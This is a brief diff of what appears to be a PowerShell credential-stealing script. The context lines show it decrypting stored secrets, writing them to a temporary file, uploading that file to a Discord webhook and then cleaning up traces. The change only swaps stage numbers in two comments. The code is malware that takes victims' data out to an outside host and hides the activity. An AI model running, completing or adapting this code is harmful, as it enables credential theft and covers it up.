@@ -31,7 +31,7 @@ $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_
 echo $l >> $env:TMP\$FileName
 
 ######################################################################################################################
-#Stage 3 Upload to discord
+#Stage 2 Upload to discord
 
 function Upload-Discord {
 
@@ -56,7 +56,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$FileNam
 
 ######################################################################################################################
 
-#Stage 2 Cleanup Traces
+#Stage 3 Cleanup Traces
 
 <#
 .NOTES 
